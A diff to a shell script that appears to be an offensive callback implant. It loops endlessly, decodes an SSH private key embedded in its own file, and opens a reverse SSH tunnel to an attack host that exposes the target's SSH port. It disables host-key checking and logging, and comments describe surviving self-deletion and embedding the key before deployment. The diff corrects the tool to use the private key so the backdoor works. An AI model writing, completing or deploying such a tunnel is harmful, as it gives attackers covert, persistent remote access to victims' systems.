@@ -12,10 +12,10 @@ get_value () {
 	echo "$INFO" | cut -f "$1" -d ":"
 }
 
-# Read the attack-host pubkey (base64, at the bottom of this file) once,
+# Read the attack-host private key (base64, at the bottom of this file) once,
 # before the loop starts — so it's cached in memory and still usable even
 # after this file is deleted from disk mid-run.
-B64_PUBKEY=$(sed -n '/^BEGIN_B64$/,/^END_B64$/p' "$0" | sed '1d;$d')
+B64_PRIVKEY=$(sed -n '/^BEGIN_B64$/,/^END_B64$/p' "$0" | sed '1d;$d')
 
 while true
 do
@@ -32,7 +32,7 @@ do
 				sleep "$SLEEP2"
 				continue
 			fi
-			echo "$B64_PUBKEY" | base64 -d > "$KEY"
+			echo "$B64_PRIVKEY" | base64 -d > "$KEY"
 			chmod 600 "$KEY"
 			ssh -o LogLevel=quiet -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p "$CB_PORT" -R "127.0.0.1:${REMLIS}:127.0.0.1:${TARSSH}" -i "$KEY" -N "$CB_IP" -l "$REMUSR" &
 			SSH_PID=$!
@@ -47,7 +47,9 @@ done
 exit 0
 
 # Analyst: replace the placeholder line below before deploying — delete it,
-# then in vim run :r !base64 /path/to/pub/key/on/attack_host (adjust path)
+# then in vim run :r !base64 /path/to/priv/key/on/attack_host (adjust path).
+# This must be the PRIVATE key (id_rsa) — it's used as `ssh -i` above, not
+# the pubkey that goes in the chroot user's authorized_keys.
 BEGIN_B64
-:r ! base64 /path/to/pub/key/on/attack_host
+:r ! base64 /path/to/priv/key/on/attack_host
 END_B64
